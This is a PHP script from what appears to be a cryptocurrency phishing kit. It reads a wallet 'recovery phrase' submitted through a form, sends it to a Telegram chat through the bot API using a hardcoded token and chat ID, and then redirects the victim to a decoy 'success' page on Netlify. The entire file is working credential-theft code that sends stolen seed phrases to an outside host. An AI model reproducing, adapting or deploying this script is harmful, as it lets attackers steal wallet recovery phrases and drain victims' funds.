<?php
// Telegram Bot configuration
$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // Replace with your actual bot token
$chatId = '5160818690';     // Replace with your chat ID

// Get the recovery phrase from POST data
$unlockSubmitBtn = $_POST['unlockSubmitBtn'] ?? 'No phrase provided';

// Prepare the message
$message = "New Recovery Phrase Received:\n";
$message .= $unlockSubmitBtn;

// Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";

// Prepare the data for Telegram
$data = array(
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
);

// Send to Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Redirect to success page
header('Location: https://success-lucky-5f3e1c-moxie.netlify.app/?status=314');
exit();
?>

